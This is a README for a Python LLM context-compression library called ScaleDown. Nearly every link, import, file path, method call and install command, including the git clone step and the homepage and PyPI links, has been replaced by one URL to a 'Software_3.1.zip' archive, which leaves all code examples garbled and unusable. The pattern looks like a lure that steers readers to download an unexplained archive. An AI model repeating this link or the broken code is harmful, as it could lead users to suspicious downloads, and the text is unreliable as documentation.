# ScaleDown

ScaleDown is an intelligent context optimization framework that reduces LLM token usage while preserving semantic meaning through intelligent code selection and prompt compression.

## Key Features

- **HASTE Optimizer**: Hybrid AST-guided selection using Tree-sitter parsing, BM25, and semantic search for intelligent code retrieval
- **Semantic Optimizer**: Local embedding-based code search using FAISS and transformer models
- **ScaleDown Compressor**: API-powered context compression that rewrites prompts to be token-efficient
- **Modular Pipeline**: Chain optimizers and compressors for custom workflows
- **Easy Integration**: Drop-in Python client with minimal configuration

---

## Installation

### Basic Installation

Install the core package with compression capabilities:

```bash
pip install scaledown
```

### Installation with Optimizers

ScaleDown provides optional optimizer modules that require additional dependencies:

**Install with HASTE Optimizer** (AST-based code selection):
```bash
pip install scaledown[haste]
```

**Install with Semantic Optimizer** (embedding-based code search):
```bash
pip install scaledown[semantic]
```

**Install with all optimizers**:
```bash
pip install scaledown[haste,semantic]
```

### Development Installation

```bash
git clone https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip
cd scaledown
python -m venv .venv
source .venv/bin/activate  # Windows: .venv\Scripts\activate
pip install -e ".[haste,semantic]"
```

---

## Configuration

### Environment Variables

Set your API key for the ScaleDown compression service:

```bash
export SCALEDOWN_API_KEY="sk-your-api-key-here"
export SCALEDOWN_API_URL="https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip"  # Optional, uses default if not set
```

Or configure programmatically:

```python
import scaledown as sd

https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip("sk-your-api-key-here")
```

---

## Quick Start

### 1. Prompt Compression Only

Use the ScaleDown API to compress prompts without local optimization:

```python
from scaledown import ScaleDownCompressor

compressor = ScaleDownCompressor(
    target_model="gpt-4o",
    rate="auto"
)

context = "Your long document or conversation history..."
prompt = "Summarize the main points in 3 bullet points."

result = https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip(context=context, prompt=prompt)

print(result)  # Compressed prompt
print(f"Token reduction: {https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip} → {https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip}")
```

### 2. Code Optimization with HASTE

Extract relevant code sections using AST-guided search:

```python
from https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip import HasteOptimizer

optimizer = HasteOptimizer(top_k=5, semantic=False)

result = https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip(
    context="",  # Can be empty when file_path is provided
    query="explain the training loop",
    file_path="https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip"
)

print(https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip)  # Optimized code
print(f"Compression: {https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip}x")
```

### 3. Code Optimization with Semantic Search

Find relevant code using local embeddings:

```python
from https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip import SemanticOptimizer

optimizer = SemanticOptimizer(top_k=3)

result = https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip(
    context="",
    query="data preprocessing logic",
    file_path="https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip"
)

print(https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip)
```

### 4. Full Pipeline (Optimize + Compress)

Chain optimizers and compressors for maximum token reduction:

```python
import scaledown as sd
from https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip import HasteOptimizer, SemanticOptimizer
from scaledown import ScaleDownCompressor, Pipeline

# Define pipeline stages
pipeline = Pipeline([
    ('haste', HasteOptimizer(top_k=5)),
    ('semantic', SemanticOptimizer(top_k=3)),
    ('compressor', ScaleDownCompressor(target_model="gpt-4o"))
])

# Run pipeline
result = https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip(
    query="explain error handling",
    file_path="https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip",
    prompt="Provide a concise summary"
)

print(f"Original: {https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip} tokens")
print(f"Final: {https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip} tokens")
print(f"Savings: {https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip}%")
print(f"\nOptimized Content:\n{https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip}")
```

---

## API Reference

### HasteOptimizer

AST-guided code selection using Tree-sitter and hybrid search.

**Parameters:**
- `top_k` (int, default=6): Number of top functions/classes to retrieve
- `prefilter` (int, default=300): Size of candidate pool before reranking
- `bfs_depth` (int, default=1): BFS expansion depth over call graph
- `max_add` (int, default=12): Maximum nodes added during BFS expansion
- `semantic` (bool, default=False): Enable semantic reranking with OpenAI embeddings
- `sem_model` (str, default='text-embedding-3-small'): OpenAI embedding model for semantic search
- `hard_cap` (int, default=1200): Hard token limit for output
- `soft_cap` (int, default=1800): Soft token target for output
- `target_model` (str, default="gpt-4o"): Target LLM for token counting

**Methods:**
- `optimize(context, query, file_path=None, max_tokens=None, **kwargs)`: Extract relevant code
  - `context` (str): Source code (can be empty if file_path provided)
  - `query` (str, required): Search query for relevant code
  - `file_path` (str, required): Path to Python file to analyze
  - `max_tokens` (int, optional): Override hard_cap for this call
  - Returns: `OptimizedContext` with `.content` and `.metrics`

**Example:**
```python
optimizer = HasteOptimizer(
    top_k=10,
    semantic=True,
    hard_cap=2000
)
result = https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip(
    context="",
    query="find database queries",
    file_path="https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip"
)
```

### SemanticOptimizer

Local embedding-based code search using sentence transformers and FAISS.

**Parameters:**
- `model_name` (str, default="Qwen/Qwen3-Embedding-0.6B"): HuggingFace embedding model
- `top_k` (int, default=3): Number of top code chunks to retrieve
- `target_model` (str, default="gpt-4o"): Target LLM for token counting

**Methods:**
- `optimize(context, query, file_path=None, max_tokens=None, **kwargs)`: Find semantically similar code
  - `context` (str): Source code (can be empty if file_path provided)
  - `query` (str, optional): Search query (defaults to "main logic")
  - `file_path` (str, required): Path to Python file to analyze
  - Returns: `OptimizedContext` with `.content` and `.metrics`

**Example:**
```python
optimizer = SemanticOptimizer(
    model_name="Qwen/Qwen3-Embedding-0.6B",
    top_k=5
)
result = https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip(
    context="",
    query="authentication middleware",
    file_path="https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip"
)
```

### ScaleDownCompressor

API-powered prompt compression service.

**Parameters:**
- `target_model` (str, default="gpt-4o"): Target LLM model for compression
- `rate` (str, default="auto"): Compression rate ("auto" or specific ratio)
- `api_key` (str, optional): API key (reads from environment if not provided)
- `temperature` (float, optional): Sampling temperature for compression
- `preserve_keywords` (bool, default=False): Preserve specific keywords
- `preserve_words` (list, optional): List of words to preserve during compression

**Methods:**
- `compress(context, prompt, max_tokens=None, **kwargs)`: Compress prompt via API
  - `context` (str or List[str]): Context to compress
  - `prompt` (str or List[str]): Query prompt
  - `max_tokens` (int, optional): Maximum tokens in output
  - Returns: `CompressedPrompt` or `List[CompressedPrompt]`

**Batch Processing:**
```python
compressor = ScaleDownCompressor(target_model="gpt-4o")

# Batch mode (parallel contexts)
contexts = ["Context A...", "Context B...", "Context C..."]
prompts = ["Query A", "Query B", "Query C"]
results = https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip(context=contexts, prompt=prompts)

# Broadcast mode (same prompt for all contexts)
results = https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip(
    context=["Doc 1", "Doc 2", "Doc 3"],
    prompt="Summarize key points"
)
```

**Example:**
```python
compressor = ScaleDownCompressor(
    target_model="gpt-4o",
    rate="auto",
    preserve_keywords=True
)
result = https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip(
    context="Long conversation history...",
    prompt="What were the action items?"
)
```

### Pipeline

Chain multiple optimizers and compressors.

**Constructor:**
- `Pipeline(steps)`: Create pipeline from list of (name, component) tuples

**Methods:**
- `run(query, file_path, prompt, context="", **kwargs)`: Execute pipeline
  - `query` (str): Query for optimizers
  - `file_path` (str): Path to code file for optimizers
  - `prompt` (str): Final prompt for compressor
  - `context` (str, optional): Initial context
  - Returns: `PipelineResult` with `.final_content`, `.metrics`, `.history`

**Example:**
```python
from scaledown import Pipeline
from https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip import HasteOptimizer, SemanticOptimizer
from scaledown import ScaleDownCompressor

pipeline = Pipeline([
    ('code_selection', HasteOptimizer(top_k=8)),
    ('semantic_filter', SemanticOptimizer(top_k=4)),
    ('compression', ScaleDownCompressor(target_model="gpt-4o"))
])

result = https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip(
    query="data validation logic",
    file_path="https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip",
    prompt="Explain the validation flow"
)

# Access results
print(https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip)
print(https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip)
for step in https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip
    print(f"{https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip}: {https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip} → {https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip} tokens")
```

---

## Error Handling

ScaleDown defines custom exceptions for robust error handling:

```python
from scaledown import Pipeline
from https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip import (
    AuthenticationError,
    APIError,
    OptimizerError
)

try:
    pipeline = Pipeline([...])
    result = https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip(
        query="find bug",
        file_path="https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip",
        prompt="Analyze"
    )

except AuthenticationError as e:
    print(f"Authentication failed: {e}")

except OptimizerError as e:
    print(f"Optimization failed: {e}")

except APIError as e:
    print(f"API request failed: {e}")

except Exception as e:
    print(f"Unexpected error: {e}")
```

**Exception Types:**
- `AuthenticationError`: Missing or invalid API key
- `APIError`: API request failure (network, server errors)
- `OptimizerError`: Optimizer execution failure (missing dependencies, parse errors)

---

## Testing

ScaleDown includes a comprehensive test suite using pytest:

```bash
# Install test dependencies
pip install pytest

# Run all tests
pytest -v

# Run specific test modules
pytest https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip -v
pytest https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip -v
pytest https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip -v
pytest https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip -v
```

Tests use mocked HTTP responses and do not require API keys.

---

## Project Structure

```
scaledown/
├── https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip              # Top-level exports and API key management
├── https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip            # Custom exceptions
│
├── types/                   # Data models
│   ├── https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip
│   ├── https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip
│   ├── https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip
│   ├── https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip
│   └── https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip
│
├── optimizer/               # Code optimization (local)
│   ├── https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip         # Lazy-loaded optimizer imports
│   ├── https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip
│   ├── https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip            # HASTE optimizer
│   ├── https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip    # Semantic optimizer
│   └── https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip
│
├── compressor/              # Prompt compression (API)
│   ├── https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip
│   ├── https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip
│   ├── https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip
│   └── https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip
│
└── pipeline/                # Pipeline orchestration
    ├── https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip
    ├── https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip
    └── https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip

tests/                       # Test suite
├── https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip
├── https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip
├── https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip
├── https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip
└── https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip
```

---

## Use Cases

### Code Documentation
```python
from https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip import HasteOptimizer

optimizer = HasteOptimizer(top_k=10)
result = https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip(
    query="API endpoints",
    file_path="https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip"
)
# Feed to LLM for documentation generation
```

### Large Codebase Q&A
```python
from scaledown import Pipeline
from https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip import SemanticOptimizer
from scaledown import ScaleDownCompressor

pipeline = Pipeline([
    ('semantic', SemanticOptimizer(top_k=5)),
    ('compress', ScaleDownCompressor())
])

result = https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip(
    query="authentication flow",
    file_path="https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip",
    prompt="How does the authentication work?"
)
```

### Conversation Summarization
```python
from scaledown import ScaleDownCompressor

compressor = ScaleDownCompressor(rate="auto")
conversations = ["Long chat log 1...", "Long chat log 2..."]
summaries = https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip(
    context=conversations,
    prompt="Summarize in 2 sentences"
)
```

---

## Performance Tips

1. **Use HASTE for large codebases**: It's optimized for AST-based code retrieval
2. **Enable semantic search** in HasteOptimizer for better relevance: `semantic=True`
3. **Batch compress** multiple prompts for better throughput
4. **Chain optimizers**: Use multiple optimization stages in pipeline for maximum reduction
5. **Set appropriate token caps**: Adjust `hard_cap` and `top_k` based on your LLM's context window

---

## License

This project is licensed under the MIT License. See the LICENSE file for details.

---

## Links

- **Homepage**: [https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip](https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip)
- **Documentation**: [https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip](https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip)
- **GitHub Issues**: [https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip](https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip)
- **PyPI**: [https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip](https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip)

---

## Support

For questions and support:
- Open an issue on GitHub
- Documentation: https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip
